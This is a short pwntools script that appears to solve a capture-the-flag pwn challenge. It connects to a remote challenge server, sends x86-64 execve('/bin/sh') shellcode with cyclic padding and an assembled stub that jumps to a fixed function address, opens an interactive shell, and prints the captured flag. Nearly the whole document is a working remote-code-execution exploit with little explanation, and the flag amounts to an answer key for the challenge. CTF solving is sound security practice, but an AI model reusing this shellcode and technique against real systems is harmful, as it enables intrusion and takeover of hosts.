from pwn import *
elf = ELF('./prog', checksec=False)
context.clear(arch='amd64')
#p = elf.process()
p = remote('167.99.198.188', 1337)
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = b''.join([
    shellcode, cyclic(0x3f4 - len(shellcode)),
    asm('''
    push 0x401199
    pop rax
    jmp rax
    ''') # limited input, input shellcode that jmp to aaa@func address
])
p.sendlineafter(b' > ', payload)
p.interactive()
# shellmates{RCE_with0ut_RIP_0verwrit3}